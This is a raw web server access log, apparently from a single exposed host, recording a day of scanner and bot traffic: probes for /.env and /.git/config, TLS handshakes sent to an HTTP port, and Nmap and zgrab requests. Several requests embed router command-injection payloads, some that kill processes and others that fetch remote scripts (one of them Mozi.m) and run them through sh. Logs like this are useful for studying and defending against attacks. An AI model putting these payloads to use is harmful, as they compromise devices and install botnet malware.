172.169.5.232 - - [23/Sep/2024:22:26:43 +0000] "GET /hudson HTTP/1.1" 302 - "-" "Mozilla/5.0 zgrab/0.x"
185.224.128.47 - - [23/Sep/2024:22:29:39 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
198.235.24.18 - - [23/Sep/2024:22:48:33 +0000] "GET / HTTP/1.1" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
80.82.77.202 - - [23/Sep/2024:22:56:42 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
193.187.91.20 - - [23/Sep/2024:23:02:05 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
129.232.209.234 - - [23/Sep/2024:23:02:06 +0000] "GET /PpXD HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
35.184.223.229 - - [23/Sep/2024:23:18:23 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
57.151.49.237 - - [23/Sep/2024:23:20:26 +0000] "GET /druid/index.html HTTP/1.1" 302 - "-" "Mozilla/5.0 zgrab/0.x"
35.184.223.229 - - [23/Sep/2024:23:20:56 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
35.184.223.229 - - [23/Sep/2024:23:20:56 +0000] "GET /evox/about HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.184.223.229 - - [23/Sep/2024:23:20:56 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
35.184.223.229 - - [23/Sep/2024:23:20:56 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.184.223.229 - - [23/Sep/2024:23:20:56 +0000] "GET /HNAP1 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.184.223.229 - - [23/Sep/2024:23:20:56 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
35.184.223.229 - - [23/Sep/2024:23:20:57 +0000] "POST /sdk HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.184.223.229 - - [23/Sep/2024:23:21:18 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
35.184.223.229 - - [23/Sep/2024:23:21:18 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
135.125.246.189 - - [23/Sep/2024:23:44:47 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [23/Sep/2024:23:44:48 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
149.102.251.11 - - [24/Sep/2024:00:05:09 +0000] "GET /58uz HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0"
149.102.251.11 - - [24/Sep/2024:00:05:12 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0"
135.125.246.189 - - [24/Sep/2024:00:19:41 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [24/Sep/2024:00:19:41 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
5.189.172.158 - - [24/Sep/2024:00:20:42 +0000] "\x16\x03\x01\x01\xa8\x01" 400 226 "-" "-"
34.248.192.181 - - [24/Sep/2024:00:27:25 +0000] "GET / HTTP/1.1" 200 1401 "-" "Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1"
34.248.192.181 - - [24/Sep/2024:00:28:56 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
34.248.192.181 - - [24/Sep/2024:00:28:56 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36"
34.248.192.181 - - [24/Sep/2024:00:28:56 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3844.0 Safari/537.36"
5.188.87.40 - - [24/Sep/2024:00:41:00 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Go-http-client/1.1"
154.216.17.66 - - [24/Sep/2024:01:10:49 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Mozilla/5.0 (Linux; Android 7.0; SM-T819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Safari/537.36"
5.189.172.158 - - [24/Sep/2024:01:18:52 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 302 - "-" "xfa1"
34.248.192.181 - - [24/Sep/2024:01:20:32 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/605.1"
172.212.58.126 - - [24/Sep/2024:01:20:46 +0000] "GET /manager/html HTTP/1.1" 302 - "-" "Mozilla/5.0 zgrab/0.x"
34.248.192.181 - - [24/Sep/2024:01:21:22 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5"
34.248.192.181 - - [24/Sep/2024:01:21:22 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
34.248.192.181 - - [24/Sep/2024:01:21:22 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
91.90.42.154 - - [24/Sep/2024:01:22:50 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [24/Sep/2024:01:22:50 +0000] "GET /OSKo HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0"
91.90.42.154 - - [24/Sep/2024:01:22:51 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0"
91.90.42.154 - - [24/Sep/2024:01:22:51 +0000] "GET /2pPk HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0"
149.50.103.48 - - [24/Sep/2024:01:23:31 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
172.104.11.51 - - [24/Sep/2024:01:55:31 +0000] "\x16\x03\x01" 400 226 "-" "-"
135.125.246.189 - - [24/Sep/2024:02:19:50 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [24/Sep/2024:02:19:50 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.216.17.66 - - [24/Sep/2024:02:22:47 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/71.0.3578.98 Chrome/71.0.3578.98 Safari/537.36"
205.210.31.42 - - [24/Sep/2024:02:29:52 +0000] "\x16\x03\x01" 400 226 "-" "-"
205.210.31.42 - - [24/Sep/2024:02:29:52 +0000] "\x16\x03\x01" 400 226 "-" "-"
95.214.55.43 - - [24/Sep/2024:02:31:25 +0000] "GET /webpages/login.html HTTP/1.1" 302 - "-" "Go-http-client/1.1"
95.214.55.43 - - [24/Sep/2024:02:31:25 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58:80/webpages/login.html" "Go-http-client/1.1"
85.10.56.126 - - [24/Sep/2024:02:55:59 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
194.54.83.21 - - [24/Sep/2024:02:56:03 +0000] "GET /oG8n HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
111.224.192.155 - - [24/Sep/2024:02:56:55 +0000] "HEAD / HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0"
185.224.128.59 - - [24/Sep/2024:03:20:48 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.224.128.59 - - [24/Sep/2024:03:20:48 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
8.219.63.9 - - [24/Sep/2024:03:47:20 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
91.90.42.154 - - [24/Sep/2024:03:53:55 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [24/Sep/2024:03:53:56 +0000] "GET /LyPG HTTP/1.1" 302 - "-" "Mozilla/5.9 (Windows NT 6.1; Trident/7.0; rv:11.0) like mail.163.com"
91.90.42.154 - - [24/Sep/2024:03:53:56 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.9 (Windows NT 6.1; Trident/7.0; rv:11.0) like mail.163.com"
91.90.42.154 - - [24/Sep/2024:03:53:56 +0000] "GET /YhPL HTTP/1.1" 302 - "-" "Mozilla/5.9 (Windows NT 6.1; Trident/7.0; rv:11.0) like mail.163.com"
205.210.31.66 - - [24/Sep/2024:04:10:36 +0000] "GET / HTTP/1.1" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
167.99.230.49 - - [24/Sep/2024:04:11:26 +0000] "\x16\x03\x01" 400 226 "-" "-"
167.99.230.49 - - [24/Sep/2024:04:11:26 +0000] "\x16\x03\x01" 400 226 "-" "-"
167.99.230.49 - - [24/Sep/2024:04:11:26 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.230.49 - - [24/Sep/2024:04:11:26 +0000] "GET /form.html HTTP/1.1" 302 - "-" "curl/8.1.2"
167.99.230.49 - - [24/Sep/2024:04:11:26 +0000] "GET /upl.php HTTP/1.1" 302 - "-" "Mozilla/5.0"
167.99.230.49 - - [24/Sep/2024:04:11:26 +0000] "GET /t4 HTTP/1.1" 302 - "-" "Mozilla/5.0"
167.99.230.49 - - [24/Sep/2024:04:11:26 +0000] "GET /geoip/ HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.230.49 - - [24/Sep/2024:04:11:26 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.230.49 - - [24/Sep/2024:04:11:26 +0000] "GET /1.php HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.230.49 - - [24/Sep/2024:04:11:26 +0000] "GET /systembc/password.php HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.230.49 - - [24/Sep/2024:04:11:26 +0000] "GET /password.php HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
95.214.55.138 - - [24/Sep/2024:04:21:42 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
111.224.192.155 - - [24/Sep/2024:04:23:11 +0000] "HEAD /match HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0"
185.224.128.83 - - [24/Sep/2024:04:41:19 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.224.128.83 - - [24/Sep/2024:04:41:20 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
135.125.246.189 - - [24/Sep/2024:04:50:20 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [24/Sep/2024:04:50:21 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
94.156.68.162 - - [24/Sep/2024:04:51:13 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1"
135.125.246.189 - - [24/Sep/2024:05:01:23 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [24/Sep/2024:05:01:23 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
4.255.99.81 - - [24/Sep/2024:05:20:20 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 zgrab/0.x"
172.169.6.164 - - [24/Sep/2024:05:20:25 +0000] "GET /actuator/health HTTP/1.1" 302 - "-" "Mozilla/5.0 zgrab/0.x"
185.16.39.118 - - [24/Sep/2024:05:35:21 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [24/Sep/2024:05:40:47 +0000] "GET / HTTP/1.0" 200 1401 "-" "Opera/9.80 (Android 4.0.4; Linux; Opera Mobi/ADR-1205181138; U; pl) Presto/2.10.254 Version/12.00"
185.224.128.47 - - [24/Sep/2024:06:45:03 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
136.144.17.30 - - [24/Sep/2024:06:46:26 +0000] "GET /ab2g HTTP/1.1" 302 - "-" ""
136.144.17.30 - - [24/Sep/2024:06:46:27 +0000] "GET / HTTP/1.1" 200 1401 "-" ""
136.144.17.30 - - [24/Sep/2024:06:46:27 +0000] "GET /ab2h HTTP/1.1" 302 - "-" ""
136.144.17.30 - - [24/Sep/2024:06:46:27 +0000] "GET / HTTP/1.1" 200 1401 "-" ""
91.92.243.155 - - [24/Sep/2024:07:00:12 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Mozilla/5.0 (Linux; Android 4.3; SPH-L710 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
93.174.93.12 - - [24/Sep/2024:07:23:15 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
130.185.255.230 - - [24/Sep/2024:07:58:43 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
201.217.220.26 - - [24/Sep/2024:07:58:45 +0000] "GET /Km5o HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
135.125.246.189 - - [24/Sep/2024:08:18:46 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [24/Sep/2024:08:18:46 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
112.94.97.217 - - [24/Sep/2024:08:30:18 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 - "-" "-"
185.191.126.213 - - [24/Sep/2024:08:41:58 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
91.90.42.154 - - [24/Sep/2024:08:45:00 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [24/Sep/2024:08:45:01 +0000] "GET /3Shn HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSCOM)"
91.90.42.154 - - [24/Sep/2024:08:45:01 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSCOM)"
91.90.42.154 - - [24/Sep/2024:08:45:01 +0000] "GET /sFJZ HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSCOM)"
178.128.171.174 - - [24/Sep/2024:08:46:46 +0000] "\x16\x03\x01\x01\xfb\x01" 400 226 "-" "-"
162.216.150.22 - - [24/Sep/2024:08:59:30 +0000] "GET / HTTP/1.1" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
43.157.66.187 - - [24/Sep/2024:09:06:51 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
135.125.246.189 - - [24/Sep/2024:09:07:28 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [24/Sep/2024:09:07:29 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.72.213.63 - - [24/Sep/2024:10:07:00 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
52.249.35.104 - - [24/Sep/2024:10:08:26 +0000] "MGLNDD_54.224.97.58_80\n" 400 226 "-" "-"
34.72.213.63 - - [24/Sep/2024:10:09:33 +0000] "POST /sdk HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
34.72.213.63 - - [24/Sep/2024:10:09:33 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
34.72.213.63 - - [24/Sep/2024:10:09:33 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
34.72.213.63 - - [24/Sep/2024:10:09:34 +0000] "GET /evox/about HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
34.72.213.63 - - [24/Sep/2024:10:09:34 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
34.72.213.63 - - [24/Sep/2024:10:09:34 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
34.72.213.63 - - [24/Sep/2024:10:09:34 +0000] "GET /HNAP1 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
34.72.213.63 - - [24/Sep/2024:10:09:55 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
34.72.213.63 - - [24/Sep/2024:10:09:55 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
135.125.246.189 - - [24/Sep/2024:10:21:39 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [24/Sep/2024:10:21:39 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.42.116.213 - - [24/Sep/2024:10:29:49 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
198.235.24.131 - - [24/Sep/2024:10:36:09 +0000] "GET / HTTP/1.0" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
135.125.246.189 - - [24/Sep/2024:10:37:47 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [24/Sep/2024:10:37:47 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.211.139.188 - - [24/Sep/2024:10:51:45 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.90.42.154 - - [24/Sep/2024:11:09:57 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [24/Sep/2024:11:09:57 +0000] "GET /VMTe HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUS)"
91.90.42.154 - - [24/Sep/2024:11:09:57 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUS)"
91.90.42.154 - - [24/Sep/2024:11:09:58 +0000] "GET /nvI0 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUS)"
93.174.93.12 - - [24/Sep/2024:11:11:56 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1726) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"
95.214.55.43 - - [24/Sep/2024:11:20:39 +0000] "GET /webpages/login.html HTTP/1.1" 302 - "-" "Go-http-client/1.1"
95.214.55.43 - - [24/Sep/2024:11:20:39 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58:80/webpages/login.html" "Go-http-client/1.1"
205.210.31.158 - - [24/Sep/2024:11:26:02 +0000] "\x16\x03\x01" 400 226 "-" "-"
205.210.31.158 - - [24/Sep/2024:11:26:02 +0000] "\x16\x03\x01" 400 226 "-" "-"
94.102.49.71 - - [24/Sep/2024:11:28:29 +0000] "GET / HTTP/1.0" 200 1401 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
187.103.56.44 - - [24/Sep/2024:12:12:09 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
36.41.75.167 - - [24/Sep/2024:12:24:37 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
185.224.128.83 - - [24/Sep/2024:12:27:40 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.224.128.83 - - [24/Sep/2024:12:27:41 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.16.39.118 - - [24/Sep/2024:12:31:08 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
79.124.8.107 - - [24/Sep/2024:12:53:31 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0"
135.125.244.48 - - [24/Sep/2024:12:54:22 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [24/Sep/2024:12:54:22 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.255.151.130 - - [24/Sep/2024:12:59:50 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
143.244.33.80 - - [24/Sep/2024:12:59:50 +0000] "GET /Do0y HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
